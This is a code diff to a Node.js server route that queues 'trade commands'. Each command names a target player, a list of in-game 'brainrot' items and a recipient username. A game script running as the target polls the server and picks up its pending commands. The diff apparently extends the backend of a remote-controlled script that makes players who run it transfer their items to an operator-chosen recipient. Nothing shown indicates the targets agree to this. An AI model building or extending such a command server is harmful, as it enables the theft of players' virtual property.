@@ -50,6 +50,46 @@ function toUnixMs(value) {
     return null;
 }
 
+function normalizeTradeItems(brainrots, fallback) {
+    const out = [];
+    const seen = new Set();
+
+    const pushItem = (item) => {
+        if (!item || typeof item !== 'object') return;
+
+        const rawSlot = item.slot ?? item.brainrotSlot ?? item.brainrot_slot;
+        const parsedSlot = Number.parseInt(rawSlot, 10);
+        const slot = Number.isFinite(parsedSlot) && parsedSlot > 0 ? parsedSlot : -1;
+
+        const name = String(item.name ?? item.brainrotName ?? item.brainrot_name ?? '').trim();
+        const key = String(item.key ?? item.brainrotKey ?? item.brainrot_key ?? name).trim();
+        if (!name && !key) return;
+
+        const dedupeKey = `${slot}|${key}|${name}`;
+        if (seen.has(dedupeKey)) return;
+        seen.add(dedupeKey);
+
+        out.push({ slot, key, name: name || key });
+    };
+
+    if (Array.isArray(brainrots)) {
+        for (const entry of brainrots) {
+            pushItem(entry);
+            if (out.length >= 20) break;
+        }
+    }
+
+    if (out.length === 0 && fallback) {
+        pushItem({
+            slot: fallback.brainrotSlot,
+            key: fallback.brainrotKey,
+            name: fallback.brainrotName,
+        });
+    }
+
+    return out;
+}
+
 // --- HMAC verification (same pattern as finder.js) ---
 
 function normalizeSignature(signature, expectedHex) {
@@ -187,11 +227,34 @@ router.get('/inventory', authMiddleware, async (req, res) => {
 // =============================================
 router.post('/command', authMiddleware, async (req, res) => {
     try {
-        const { targetUserid, targetUsername, brainrotSlot, brainrotKey, brainrotName, script } = req.body;
+        const {
+            targetUserid,
+            targetUsername,
+            recipientUsername,
+            sendToUsername,
+            tradeWithUsername,
+            brainrotSlot,
+            brainrotKey,
+            brainrotName,
+            brainrots,
+            script,
+        } = req.body;
 
         if (!targetUserid || !targetUsername)
             return res.status(400).json({ error: 'Missing target player info' });
 
+        const recipient = String(recipientUsername || sendToUsername || tradeWithUsername || '').trim();
+        if (!recipient) {
+            return res.status(400).json({ error: 'Missing recipient username' });
+        }
+
+        const normalizedBrainrots = normalizeTradeItems(brainrots, { brainrotSlot, brainrotKey, brainrotName });
+        if (normalizedBrainrots.length === 0) {
+            return res.status(400).json({ error: 'Missing brainrots selection' });
+        }
+
+        const firstBrainrot = normalizedBrainrots[0];
+        const brainrotsJson = JSON.stringify(normalizedBrainrots);
         const scriptSlug = String(script || 'sabnew').trim();
         const scriptRow = await getScriptRow(scriptSlug);
         if (!scriptRow) return res.status(404).json({ error: 'Script not found' });
@@ -203,16 +266,18 @@ router.post('/command', authMiddleware, async (req, res) => {
         );
 
         const result = await dbRun(
-            `INSERT INTO trade_commands (script_id, requester_userid, target_userid, target_username, brainrot_slot, brainrot_key, brainrot_name, status)
-             VALUES (?, ?, ?, ?, ?, ?, ?, 'pending')`,
+            `INSERT INTO trade_commands (script_id, requester_userid, target_userid, target_username, recipient_username, brainrot_slot, brainrot_key, brainrot_name, brainrots_json, status)
+             VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'pending')`,
             [
                 scriptRow.id,
                 '',
                 String(targetUserid),
                 String(targetUsername),
-                parseInt(brainrotSlot, 10) || -1,
-                String(brainrotKey || ''),
-                String(brainrotName || ''),
+                recipient,
+                Number.parseInt(firstBrainrot.slot, 10) || -1,
+                String(firstBrainrot.key || ''),
+                String(firstBrainrot.name || ''),
+                brainrotsJson,
             ]
         );
 
@@ -220,7 +285,9 @@ router.post('/command', authMiddleware, async (req, res) => {
             ok: true,
             commandId: result.insertId,
             target: targetUsername,
-            brainrot: brainrotName || brainrotKey || 'any',
+            recipient,
+            queuedCount: normalizedBrainrots.length,
+            brainrot: firstBrainrot.name || firstBrainrot.key || 'any',
         });
     } catch (err) {
         console.error('[Trade] command error:', err.message);
@@ -244,7 +311,7 @@ router.post('/poll', async (req, res) => {
 
         // Find the oldest pending command for this script + exact target user.
         const command = await dbGet(
-            `SELECT id, target_userid, target_username, brainrot_slot, brainrot_key, brainrot_name
+            `SELECT id, target_userid, target_username, recipient_username, brainrot_slot, brainrot_key, brainrot_name, brainrots_json
              FROM trade_commands
              WHERE script_id = ? AND status = 'pending' AND target_userid = ?
              ORDER BY created_at ASC
@@ -268,15 +335,34 @@ router.post('/poll', async (req, res) => {
             return res.json({ ok: true, command: null });
         }
 
+        let parsedBrainrots = [];
+        if (typeof command.brainrots_json === 'string' && command.brainrots_json.trim() !== '') {
+            try {
+                const json = JSON.parse(command.brainrots_json);
+                if (Array.isArray(json)) {
+                    parsedBrainrots = json;
+                }
+            } catch { }
+        }
+        if (!Array.isArray(parsedBrainrots) || parsedBrainrots.length === 0) {
+            parsedBrainrots = [{
+                slot: Number.parseInt(command.brainrot_slot, 10) || -1,
+                key: String(command.brainrot_key || ''),
+                name: String(command.brainrot_name || command.brainrot_key || ''),
+            }];
+        }
+
         res.json({
             ok: true,
             command: {
                 id: command.id,
                 targetUserid: command.target_userid,
                 targetUsername: command.target_username,
+                recipientUsername: command.recipient_username || '',
                 brainrotSlot: command.brainrot_slot,
                 brainrotKey: command.brainrot_key,
                 brainrotName: command.brainrot_name,
+                brainrots: parsedBrainrots,
             },
         });
     } catch (err) {
@@ -292,7 +378,8 @@ router.get('/commands', authMiddleware, async (req, res) => {
     try {
         const rows = await dbAll(
             `SELECT tc.id, tc.target_userid, tc.target_username, tc.brainrot_slot, tc.brainrot_key,
-                    tc.brainrot_name, tc.status, tc.created_at, tc.picked_up_at,
+                    tc.brainrot_name, tc.recipient_username, tc.brainrots_json,
+                    tc.status, tc.created_at, tc.picked_up_at,
                     s.slug AS script_slug
              FROM trade_commands tc
              JOIN scripts s ON s.id = tc.script_id
